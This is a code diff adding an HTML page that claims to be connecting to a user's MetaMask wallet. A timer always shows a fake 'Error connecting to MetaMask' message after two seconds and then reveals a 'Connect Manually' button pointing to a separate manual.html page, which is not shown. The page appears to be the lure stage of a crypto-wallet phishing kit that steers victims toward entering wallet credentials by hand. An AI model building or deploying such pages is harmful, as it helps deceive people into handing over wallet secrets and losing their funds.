@@ -1,0 +1,27 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Connecting...</title>
+  <style>
+    body { font-family: Arial, sans-serif; background:#070617; color:#fff; display:flex; justify-content:center; align-items:center; height:100vh; padding:20px; }
+    .box { text-align:center; background:#0f0b16; padding:30px; border-radius:12px; }
+    .status { font-size:20px; margin-bottom:20px; }
+    .btn { background:#6f67ff; padding:15px 25px; border-radius:6px; color:#fff; text-decoration:none; font-weight:700; }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <div class="status" id="status">Connecting to your wallet...</div>
+    <a href="manual.html?wallet=MetaMask" id="manualBtn" class="btn" style="display:none;">Connect Manually</a>
+  </div>
+
+<script>
+  setTimeout(() => {
+    document.getElementById("status").textContent = "Error connecting to MetaMask.";
+    document.getElementById("manualBtn").style.display = "inline-block";
+  }, 2000);
+</script>
+</body>
+</html>
